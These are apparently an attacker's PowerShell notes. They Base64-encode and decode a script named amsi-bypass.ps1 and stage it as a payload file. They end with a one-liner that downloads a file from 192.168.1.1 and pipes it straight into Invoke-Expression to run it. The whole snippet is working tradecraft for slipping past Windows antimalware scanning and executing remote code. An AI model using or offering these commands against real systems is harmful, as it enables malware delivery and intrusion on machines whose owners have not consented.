# B64 Ecoding:
$Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes([System.IO.File]::ReadAllText("C:\Users\jmbourbon\Desktop\TOOLS\PowerShell\amsi-bypass.ps1")))
Write-Output $Base64| Out-File "payload-b64"

# B64 Decoding:
$bytes = [Convert]::FromBase64String($Base64)
[IO.File]::WriteAllBytes("C:\Users\jmbourbon\Desktop\TOOLS\PowerShell\payload-b64-decoded", $bytes)

# Then host the b64 file and iwr (Invoke-WebRequest) or wget it (shortest way):
powershell "wget 192.168.1.1/f|iex"
